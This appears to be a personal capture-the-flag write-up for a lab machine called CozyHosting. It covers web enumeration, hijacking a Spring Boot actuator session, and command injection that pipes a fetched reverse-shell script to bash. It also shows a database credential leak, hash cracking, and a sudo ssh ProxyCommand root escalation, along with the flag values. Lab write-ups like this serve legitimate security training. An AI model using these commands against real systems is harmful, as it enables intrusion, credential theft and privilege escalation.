
Target : 10.129.28.153

Started off with the port scan : 22, 80

Updated cozyhosting.htb in /etc/hosts

Enumerating Port : 80

**Subdomain Fuzzing using fuff**

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cozyhosting.htb" -u http://cozyhosting.htb/ -mc 200`

Got nothing interesting in it.

**Directory Bruteforcing using gobuster**

`gobuster dir -u "http://cozyhosting.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`

![](../Pasted%20image%2020260707144137.png)

in the /login path we have login page, but there is no register or signup page, either we need credential pair to access the page, or we need to levearage any vulnerbilities to access it, i looked for sql injection using sqlmap, and found it is vulnerable to SQLi (false positive)

`sqlmap -r req --batch --dbs`

and that's a dead end.

Actually this is a springboot application, /actuator endpoint is enabled, which revealed sessions. 

Using the session got the admin access.

![](../Pasted%20image%2020260707151310.png)

In the admin dashboard, there is a feature, where we can connect through ssh (hostname, username is required)

hostname is handled well, we can't do injection in that, then tried in username, it worked. We know that the username field does not accept white spaces, so to bypass this we can use ${IFS} as a delimiter, which is a special shell variable that stands for Internal Field Separator and defaults to a space (followed by a tab and a newline) in shells like Bash and sh .

`python3 -m http.server 8081`

`test;curl${IFS}http://10.10.16.241:8081/;  (We got the ping)`

![](../Pasted%20image%2020260707154217.png)

We know curl works fine, we can use this execute revshell

```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<attacker_ip>/1234 0>&1' > rev.sh
```

Triggering payload

`test;curl${IFS}http://10.10.16.241:8081/rev.sh|bash;'

Got the shell as user : `app`

Found the cloudhosting-0.0.1.jar file in the app folder

```
unzip cloudhosting-0.0.1.jar 
cd /BOOT-INF/classes/
cat application.properties

server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR 

```

we got database credentials.

Connected using psql : psql -h localhost -p 5432 -U postgres

Found users table dumped it.

 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

Now, we can crack the hash using john

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`josh : manchesterunited`

`user.txt : ba4b0e750272952113041a27c0e02f37`

Root Escalation:

`sudo -l`          (it reveals escalation path)

user can execute ssh with sudo rights

![](../Pasted%20image%2020260707165604.png)

Then, looked in gtfo bins for escalation, and got it.

`ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x`

![](../Pasted%20image%2020260707165709.png)

And exploited succesfully, got the root flag.

`root.txt : 4eb982968dcbdbaab061ec09ecd77a78`



**To be noted:**

1. Stuck in directory enumeration part, did everything i know, but i'm not aware of springboot based wordlist and the /actuator endpoit which lead to bypass the login.
2. Then, looked for configuration files for any hardcoded passwords, but no luck. after verifying everyfiles manually in the .jar file revealed "database credentials". 